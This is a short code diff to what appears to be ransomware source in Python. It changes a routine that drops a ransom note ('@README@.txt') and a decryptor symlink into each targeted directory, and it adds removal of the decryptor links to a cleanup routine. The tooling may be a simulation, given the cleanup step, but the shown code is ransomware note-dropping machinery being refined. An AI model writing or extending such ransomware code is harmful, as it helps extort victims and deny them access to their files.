@@ -145,7 +145,9 @@ class Program():
         cwd = os.getcwd()
         for dir in self.__directories_with_files:
             self.__create_ransomnote_file(dir, content)
-            os.symlink(os.path.join(cwd, "decrypt.py"), os.path.join(dir, "decryptor.py"))
+            path = os.path.join(dir, "decryptor.py")
+            if not os.path.exists(path):
+                os.symlink(os.path.join(cwd, "decrypt.py"), path)
 
     def __create_ransomnote_file(self, dst_path=".", content=None):
         with open(dst_path + "/@README@.txt", "w") as output_file:
@@ -164,8 +166,12 @@ class Program():
         
         for dir in self.__directories_with_files:
             ransomnote_path = dir + "/@README@.txt"
+            decryptor_path = os.path.join(dir, "decryptor.py")
             if os.path.exists(ransomnote_path):
                 os.remove(ransomnote_path)
+
+            if os.path.exists(decryptor_path):
+                os.remove(decryptor_path)
 
         if os.path.exists("discovered_info.json"):
             os.remove("discovered_info.json")
